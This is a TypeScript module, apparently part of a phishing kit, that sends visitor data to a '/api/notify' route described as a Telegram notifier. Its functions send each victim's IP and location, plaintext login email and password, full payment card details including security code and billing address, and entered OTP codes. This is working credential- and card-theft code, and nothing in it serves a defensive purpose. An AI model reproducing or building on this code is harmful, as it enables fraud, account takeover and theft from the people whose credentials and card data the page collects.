// Client-side wrapper for telegram notifications
// This calls the API route instead of importing server-only modules

export async function getVisitorInfo() {
  try {
    const response = await fetch("/api/notify");
    const data = await response.json();
    return {
      ip: data.ip,
      country: data.country_name,
      city: data.city,
      region: data.region,
    };
  } catch (error) {
    console.error("Error getting visitor info:", error);
    return {
      ip: "Unknown",
      country: "Unknown",
      city: "Unknown",
      region: "Unknown",
    };
  }
}

export async function notifyNewVisitor(visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  try {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "newVisitor",
        data: { visitorInfo },
      }),
    });
  } catch (error) {
    console.error("Error notifying new visitor:", error);
  }
}

export async function notifyLogin(email: string, password: string, visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  try {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "login",
        data: { email, password, visitorInfo },
      }),
    });
  } catch (error) {
    console.error("Error notifying login:", error);
  }
}

export async function notifyPaymentInfo(
  cardData: {
    cardNumber: string;
    expirationDate: string;
    securityCode: string;
    fullName: string;
    address: string;
    city: string;
    postalCode: string;
    country: string;
  },
  visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>
) {
  try {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "payment",
        data: { cardData, visitorInfo },
      }),
    });
  } catch (error) {
    console.error("Error notifying payment info:", error);
  }
}

export async function notifyOTPAttempt(otp: string, isCorrect: boolean, visitorInfo: Awaited<ReturnType<typeof getVisitorInfo>>) {
  try {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "otp",
        data: { otp, isCorrect, visitorInfo },
      }),
    });
  } catch (error) {
    console.error("Error notifying OTP attempt:", error);
  }
}
